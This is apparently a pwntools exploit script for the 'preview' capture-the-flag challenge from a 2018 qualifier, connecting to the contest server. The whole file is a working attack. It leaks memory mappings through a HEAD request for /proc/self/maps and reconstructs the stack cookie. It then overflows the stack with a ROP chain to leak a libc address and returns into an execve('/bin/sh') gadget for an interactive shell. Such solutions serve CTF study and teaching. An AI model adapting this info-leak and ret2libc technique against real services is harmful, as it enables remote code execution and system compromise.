import sys
from pwn import *

import proof_of_work

live=True
if live:
	proc = remote('cee810fa.quals2018.oooverflow.io', 31337)
	proc.recvline()
	challenge = proc.recvline().strip().split()[-1]
	n = int(proc.recvline().strip().split()[-1])
	proc.recvline()
	print('Solving challenge: "{}", n: {}'.format(challenge, n))
	solution = proof_of_work.solve_pow(challenge, n)
	print('Solution: {} -> {}'.format(solution, proof_of_work.pow_hash(challenge, solution)))
	proc.sendline(str(solution))
	p = proc
else:
	# env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
	proc = process('./preview') #, env=env)
	p = proc

context.log_level='debug'

p.sendline('HEAD /proc/self/maps')
p.recvuntil("Here's your preview:\n")
maps = p.recv(timeout=1).split('\n')
def find_map(ident):
	for m in maps:
		if ident in m and 'r-xp' in m:
			return int(m.split('-')[0],16)
	return 0
base_mmap = find_map('00:00 0')
base_ldso = find_map('ld-2.23.so' if live else 'ld-2.27.so') # 'ca:01 1969')
stack_cookie = ((base_ldso << 24) | (base_mmap >> 4)) & (0xFFFFFFFFFFFFFFFF) # IT IS A MYSTERY
print 'stack cookie = %016x' % (stack_cookie,)
# print maps

print 'break *' + hex(base_mmap + 0xfd6) 
# gdb.attach(p, 'break *' + hex(base_mmap + 0xfd6) + '\n' + 'continue')

one_gadget = base_mmap + 0x10b3 # pop rdi; ret
puts_got   = base_mmap + 0x202020
puts_plt   = base_mmap + 0x9e0
main_addr  = base_mmap + 0xfe8 # pop rdi; ret

# phase1
ovf = 'HEAD '
ovf += '\x00' * (88 - len(ovf))
ovf += p64(stack_cookie)
ovf += p64(0) # saved rbp
ovf += p64(one_gadget) # return addr
ovf += p64(puts_got) # rdi
ovf += p64(puts_plt) # puts
ovf += p64(main_addr) # return from puts

assert len(ovf) < 256
ovf += '\x00' * (250 - len(ovf))
p.sendline(ovf)
print p.recvuntil('Resource not found\n')

# leak
leak = u64(p.recvn(6) + '\x00\x00')
print 'puts@got = %016x' % (leak,)
libc = ELF('libc.so.6')
libc.address = leak - libc.symbols['puts']
print 'libc = %016x' % (libc.address)

# phase2
ovf = 'HEAD '
ovf += '\x00' * (88 - len(ovf))
ovf += p64(stack_cookie)
ovf += p64(0) # saved rbp
ovf += p64(libc.address + 0x45216) # execve(/bin/sh)
assert len(ovf) < 256
ovf += '\x00' * (250 - len(ovf))

p.sendline(ovf)
print p.recvuntil('Resource not found\n')

#rippppp
p.interactive()
